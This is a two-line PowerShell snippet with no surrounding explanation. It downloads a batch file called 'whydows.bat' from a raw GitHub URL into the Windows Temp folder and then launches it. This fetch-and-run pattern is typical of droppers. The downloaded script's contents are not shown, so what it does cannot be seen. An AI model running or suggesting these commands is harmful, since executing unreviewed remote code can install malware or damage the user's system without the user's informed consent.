powershell.exe Invoke-WebRequest https://raw.githubusercontent.com/webbrowser11/whydows/main/whydows.bat -OutFile C:\Windows\Temp\whydows.bat
powershell.exe -Command "Start-Process 'C:\Windows\Temp\whydows.bat'"
